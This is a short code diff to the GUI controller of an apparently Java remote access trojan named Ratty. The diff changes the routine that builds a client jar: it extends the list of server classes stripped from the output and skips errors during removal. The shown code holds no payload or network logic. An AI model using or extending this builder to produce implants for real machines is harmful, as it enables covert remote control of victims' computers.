@@ -108,7 +108,10 @@ public final class RattyGuiController extends AbstractRattyController implements
 		"language/lang_ro.properties",
 		"de/sogomn/rat/Server.class",
 		"de/sogomn/rat/util/Resources.class",
-		"de/sogomn/rat/builder/JarBuilder.class"
+		"de/sogomn/rat/util/JarBuilder.class",
+		"de/sogomn/rat/server/ActiveServer.class",
+		"de/sogomn/rat/server/AbstractRattyController.class",
+		"de/sogomn/rat/server/IServerObserver.class",
 	};
 	
 	private static final String FREE_WARNING = LANGUAGE.getString("server.free_warning");
@@ -512,16 +515,20 @@ public final class RattyGuiController extends AbstractRattyController implements
 			JarBuilder.copy(selectedBuilderFile);
 			JarBuilder.replaceFile(selectedBuilderFile, BUILDER_DATA_REPLACEMENT, dataReplacement);
 			JarBuilder.replaceFile(selectedBuilderFile, BUILDER_MANIFEST_REPLACEMENT, BUILDER_MANIFEST_REPLACEMENT_DATA);
-			
-			for (final String removal : BUILDER_REMOVALS) {
-				JarBuilder.removeFile(selectedBuilderFile, removal);
-			}
 		} catch (final IOException ex) {
 			gui.showError(BUILDER_ERROR_MESSAGE + System.lineSeparator() + ex);
-		} finally {
-			builder.removeListEntries();
-			builder.setVisible(false);
 		}
+		
+		for (final String removal : BUILDER_REMOVALS) {
+			try {
+				JarBuilder.removeFile(selectedBuilderFile, removal);
+			} catch (final Exception ex) {
+				continue;
+			}
+		}
+		
+		builder.removeListEntries();
+		builder.setVisible(false);
 	}
 	
 	private void selectBuilderFile() {
